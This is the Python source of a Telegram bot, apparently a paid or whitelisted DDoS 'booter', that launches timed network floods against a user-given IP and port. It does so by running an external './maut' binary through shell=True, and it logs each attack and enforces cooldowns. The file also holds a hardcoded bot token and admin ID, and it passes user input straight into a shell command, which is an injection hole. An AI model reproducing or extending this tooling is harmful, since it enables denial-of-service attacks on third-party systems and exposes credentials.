import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock
import signal

# Bot configuration
bot = telebot.TeleBot('7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0')
admin_id = {"8167507955"}
USER_FILE = "users.txt"
USER_TIME_LIMITS = "user_limits.txt"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 600  # 5 minutes
MAX_ATTACK_TIME = 240  # 3 minutes
IMAGE_URL = "https://t.me/gggkkkggggiii/9"

# Data storage
user_attack_data = {}
maut_cooldown = {}
allowed_user_ids = []
user_time_limits = {}
active_attacks = {}  # Track active attacks
attack_lock = Lock()  # Thread lock for attack operations
attack_processes = {}  # Track attack processes for stopping

def load_users():
    global allowed_user_ids, user_time_limits
    try:
        with open(USER_FILE, "r") as f:
            allowed_user_ids = f.read().splitlines()
    except FileNotFoundError:
        allowed_user_ids = []
    
    try:
        with open(USER_TIME_LIMITS, "r") as f:
            for line in f:
                user_id, limit_sec, expiry = line.strip().split("|")
                user_time_limits[user_id] = (int(limit_sec), float(expiry))
    except FileNotFoundError:
        user_time_limits = {}

def save_users():
    with open(USER_FILE, "w") as f:
        f.write("\n".join(allowed_user_ids))
    
    with open(USER_TIME_LIMITS, "w") as f:
        for user_id, (limit_sec, expiry) in user_time_limits.items():
            f.write(f"{user_id}|{limit_sec}|{expiry}\n")

def log_attack(user_id, target, port, time, status="STARTED"):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s | {status}\n")
    except Exception as e:
        print(f"Logging error: {e}")

def parse_time_input(time_str):
    time_str = time_str.lower()
    total_seconds = 0
    
    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
    
    for amount, unit in matches:
        amount = int(amount)
        if unit in ['day', 'd']:
            total_seconds += amount * 86400
        elif unit in ['hour', 'h']:
            total_seconds += amount * 3600
        elif unit in ['min', 'm']:
            total_seconds += amount * 60
        elif unit in ['sec', 's']:
            total_seconds += amount
    
    return total_seconds if total_seconds > 0 else None

def is_attack_active():
    with attack_lock:
        return bool(active_attacks)

def add_active_attack(user_id, attack_time, process):
    with attack_lock:
        active_attacks[user_id] = {
            'start_time': datetime.datetime.now(),
            'duration': attack_time,
            'process': process
        }

def remove_active_attack(user_id):
    with attack_lock:
        if user_id in active_attacks:
            if 'process' in active_attacks[user_id] and active_attacks[user_id]['process']:
                try:
                    os.killpg(os.getpgid(active_attacks[user_id]['process'].pid), signal.SIGTERM)
                except:
                    pass
            del active_attacks[user_id]

def get_active_attack_info():
    with attack_lock:
        if not active_attacks:
            return None
        user_id, attack = next(iter(active_attacks.items()))
        elapsed = (datetime.datetime.now() - attack['start_time']).seconds
        remaining = max(0, attack['duration'] - elapsed)
        return user_id, remaining, attack['process']

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.chat.id)
    
    active_info = get_active_attack_info()
    if not active_info:
        return bot.reply_to(message, "ℹ️ No active attack to stop.")
    
    active_user_id, remaining, process = active_info
    
    # Only allow the attacking user or admin to stop
    if user_id != active_user_id and user_id not in admin_id:
        return bot.reply_to(message, "❌ You can only stop your own attacks.")
    
    try:
        remove_active_attack(active_user_id)
        log_attack(active_user_id, "", "", 0, "STOPPED")
        bot.reply_to(message, "✅ Attack stopped successfully.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error stopping attack: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.message.chat.id)
    
    try:
        # Always answer callback immediately to prevent timeout
        bot.answer_callback_query(call.id)
        
        if call.data == "start_attack":
            if user_id not in user_attack_data:
                bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
                return
            
            data = user_attack_data[user_id]
            try:
                # Start attack in a separate thread to avoid blocking
                def execute_attack():
                    try:
                        # Create new process group for the attack
                        process = subprocess.Popen(
                            f"./maut {data['ip']} {data['port']} {data['time']} 900", 
                            shell=True, 
                            preexec_fn=os.setsid
                        )
                        
                        # Mark attack as active
                        add_active_attack(user_id, int(data['time']), process)
                        log_attack(user_id, data['ip'], data['port'], data['time'])
                        maut_cooldown[user_id] = datetime.datetime.now()
                        
                        # Update message
                        bot.edit_message_text(
                            chat_id=call.message.chat.id,
                            message_id=call.message.message_id,
                            text=f"🔥 *Attack Launched!* 🔥\n\n"
                                 f"🌐 Target: `{data['ip']}`\n"
                                 f"🔌 Port: `{data['port']}`\n"
                                 f"⏱ Duration: `{data['time']}`s\n\n"
                                 f"Use /stop to cancel attack\n\n"
                                 f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
                            parse_mode="Markdown"
                        )
                        
                        # Wait for attack to complete
                        time.sleep(int(data['time']))
                        
                        # Remove from active attacks if not already stopped
                        if user_id in active_attacks:
                            remove_active_attack(user_id)
                            
                            # Send completion message
                            bot.send_message(
                                call.message.chat.id,
                                f"✅ *Attack Completed!*\n\n"
                                f"🌐 Target: `{data['ip']}`\n"
                                f"⏱ Duration: `{data['time']}`s\n\n"
                                f"Cooldown: {COOLDOWN_TIME//60} minutes",
                                parse_mode="Markdown"
                            )
                            
                            # Add new attack button
                            markup = types.InlineKeyboardMarkup()
                            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
                            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
                    
                    except Exception as e:
                        if user_id in active_attacks:
                            remove_active_attack(user_id)
                        bot.send_message(call.message.chat.id, f"❌ Attack failed: {str(e)}")
                
                # Start attack in background thread
                import threading
                threading.Thread(target=execute_attack).start()
                
            except Exception as e:
                remove_active_attack(user_id)
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"❌ Error: {str(e)}"
                )
        
        elif call.data == "cancel_attack":
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="❌ Attack cancelled"
            )
        
        elif call.data == "new_attack":
            if user_id in maut_cooldown:
                remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
                if remaining > 0:
                    bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
                    return
            
            bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
    
    except Exception as e:
        print(f"Error handling callback: {e}")
        try:
            bot.answer_callback_query(call.id, "⚠️ An error occurred")
        except:
            pass

# ... [rest of your existing handlers remain the same] ...

# Initialize
load_users()

# Start bot
print("⚡ MAUT Bot Started ⚡")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
